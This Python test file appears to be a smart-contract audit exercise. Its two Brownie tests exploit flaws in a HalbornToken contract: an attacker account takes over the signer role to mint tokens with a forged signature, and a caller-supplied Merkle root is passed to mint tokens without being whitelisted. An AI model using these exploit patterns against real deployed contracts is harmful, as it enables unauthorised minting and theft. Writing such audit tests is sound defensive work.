import pytest
from brownie import *
from web3.auto import w3
from eth_abi import encode_abi
from eth_abi.packed import encode_packed


@pytest.fixture
def halborn_token():
    account = accounts[0]
    name = "TRIM"
    symbol = "TRM"
    amount = 1000
    root = "{0:#0{1}x}".format(0, 66)  # 0x0000000000000000000000000000000000000000000000000000000000000000
    return HalbornToken.deploy(name, symbol, amount, account, root, {"from": account})


# VULNERABILITY 1
# Description: Smart Contract can be taken over by changing the signer since the check condition is written incorrectly.
# Impact: Anyone is able to take over by changing the signer and then change the total supply by calling the
# mintTokensWithSignature function.
def test_vuln_1(halborn_token):
    # Different account from the one that was used to deploy the contract.
    private_key = "0x416b8a7d9290502f5661da81f0cf43893e3d19cb9aea3c426cfb36e8186e9c09"
    hacker_account = accounts.add(private_key=private_key)
    increase_supply_amount = 5000

    # Generate the message that is used to check the signature
    prefix = b'\x19Ethereum Signed Message:\n32'
    abi_encode = encode_abi(['address', 'uint256', 'address'], [halborn_token.address, increase_supply_amount, hacker_account.address])
    message_hash = w3.solidityKeccak(["bytes"], ['0x' + abi_encode.hex()])

    abi_encode_packed = encode_packed(['bytes', 'bytes'], [prefix, message_hash])
    hash_to_check = w3.solidityKeccak(["bytes"], ['0x' + abi_encode_packed.hex()]).hex()[2:]
    signed_message = w3.eth.account.signHash(hash_to_check, private_key)

    # Take over the contract by changing the signer in setSigner
    halborn_token.setSigner(hacker_account.address, {"from": hacker_account})

    # Store the current supply for comparison
    current_supply = halborn_token.totalSupply()

    # Increase the total supply with 5000 from a Hacker account
    halborn_token.mintTokensWithSignature(increase_supply_amount, signed_message.r, signed_message.s, signed_message.v, {"from": hacker_account})

    # Expected supply = initial supply 1000 + increased supply 5000
    expected_supply = current_supply + increase_supply_amount
    assert halborn_token.totalSupply() == expected_supply


# VULNERABILITY 2
# Description: The verification of MerkleRoot can be abused because the function is taking the root variable from the
# caller instead of from the variable that was set from the constructor
# Impact: Anyone is able to mint more tokens by using the mintTokensWithWhitelist function.
def test_vuln_2(halborn_token):
    # Different account from the one that was used to deploy the contract.
    hacker_account = accounts.add()

    # Calculate Leaf as expected
    msg_sender_encoded = encode_packed(['address'], [hacker_account.address])
    leaf = w3.solidityKeccak(["bytes"], ['0x' + msg_sender_encoded.hex()]).hex()[2:]

    # Generate a random proof
    proof = "{0:#0{1}}".format(1, 64)

    # Calculate computedHash for root as expected (intentionally picked proof with lower value than leaf)
    pl_encode_packed = encode_packed(['string', 'string'], [proof, leaf])
    root_pl_hash = w3.solidityKeccak(["bytes"], ['0x' + pl_encode_packed.decode()]).hex()

    # Verify we can calculate the MerkleRoot
    verify_results = halborn_token.verify(leaf, root_pl_hash, [proof])
    assert verify_results == True

    # Store the current token supply for comparison
    current_supply = halborn_token.totalSupply()
    increase_supply_amount = 5000

    # Mint more tokens
    halborn_token.mintTokensWithWhitelist(increase_supply_amount, root_pl_hash, [proof], {"from": hacker_account})

    # Check the total supply is now increased to expected supply
    expected_supply = current_supply + increase_supply_amount
    assert halborn_token.totalSupply() == expected_supply
